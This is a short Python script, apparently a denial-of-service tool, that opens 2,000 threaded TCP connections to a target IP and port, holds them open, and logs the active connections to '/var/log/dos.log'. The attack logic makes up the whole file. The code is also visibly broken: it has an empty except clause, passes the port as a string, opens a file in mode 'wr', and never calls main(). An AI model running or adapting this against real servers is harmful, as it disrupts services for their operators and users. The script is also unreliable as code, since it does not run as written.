#!/usr/bin/python

import socket
from time import sleep
import threading
import sys, signal
import argparse
import resource
import psutil

filename='/var/log/dos.log'

lock = threading.Lock()
def worker(num, ip, port, send=False):
    connected=False
    while (not connected):
        try:
            lock.acquire()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            connected=True
            lock.release()
        finally:
            if lock.locked():
                lock.release()
    try:
        while True:
            if send:
                s.send('a')
            a=1
            sleep(1)
    except KeyboardInterrupt:
    finally:
        s.close()

def run(ip, port, filename):
    resource.setrlimit(resource.RLIMIT_NOFILE, (4000, 4000))
    num_connections=2000
    threads = []

    for i in range(num_connections):
        t = threading.Thread(target=worker, args=(i, ip, port, False))
        threads.append(t)
        t.start()
        sleep(0.01)

    total_active=psutil.net_connections(kind='inet')
    with open(filename, 'wr') as f:
          f.write(total_active)
          f.write("total="+str(len(total_active)))

    for i in range(num_connections):
        threads[i].join(1000)

def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('--ip', required=True, type=str)
    parser.add_argument('--port', required=True, type=str)          
    args=parser.parse_args()
    run(args.ip, args.port, filename)
          
    sys.exit()
